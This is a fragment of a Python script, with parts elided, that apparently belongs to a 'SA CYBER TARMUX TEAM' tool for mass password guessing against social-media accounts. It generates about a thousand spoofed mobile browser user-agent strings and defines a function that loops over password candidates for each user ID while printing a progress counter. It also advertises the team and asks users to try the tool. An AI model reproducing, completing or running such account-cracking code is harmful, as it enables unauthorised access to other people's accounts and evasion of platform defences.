...
for x in range(1000):
    ...
    l='Chrome/122.0.0.0 Mobile  Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)


note1="""- __Inbox__ Me for Join `SA CYBER TARMUX TEAM`\n- Try tool and **Review**"""
n1=Markdown(note1)
...
def need(uid,pwx,fb,tl):
    ...
    sys.stdout.write(f"\r  \33[1;90m[\33[1;97mSA-XD\33[1;92m | {'{:.1%}'.format(loop/int(tl))} | \33[1;97m{loop} \33[1;90m] \r "),
    sys.stdout.flush()
    try:
        for ps in pwx:
